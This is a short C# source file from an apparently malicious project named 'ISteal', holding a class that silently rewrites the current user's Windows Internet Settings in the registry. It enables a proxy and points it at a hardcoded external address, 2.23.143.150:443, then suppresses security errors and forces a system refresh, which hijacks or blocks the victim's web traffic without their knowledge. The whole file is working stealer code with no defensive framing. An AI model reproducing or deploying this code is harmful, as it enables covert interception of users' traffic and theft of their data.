using System;
using System.Security;
using Microsoft.Win32;

namespace ISteal.New
{
    internal class IBlockIE
    {
        private const int INTERNET_OPTION_REFRESH = 0x25;
        private const int INTERNET_OPTION_SETTINGS_CHANGED = 0x27;

        private static readonly string IEPath = @"Software\Microsoft\Windows\CurrentVersion\Internet Settings";
        public static void Enabled(int block_internet = 0, string Proxy = "2.23.143.150:443")
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(IEPath, true))
                {
                    key.SetValue("ProxyEnable", block_internet);
                    key.SetValue("ProxyServer", Proxy);
                }
            }
            catch (SecurityException) { }
            catch (ArgumentException) { }

            Safe.NativeMethods.InternetSetOption(IntPtr.Zero, INTERNET_OPTION_REFRESH, IntPtr.Zero, 0);
            Safe.NativeMethods.InternetSetOption(IntPtr.Zero, INTERNET_OPTION_SETTINGS_CHANGED, IntPtr.Zero, 0);
        }
    }
}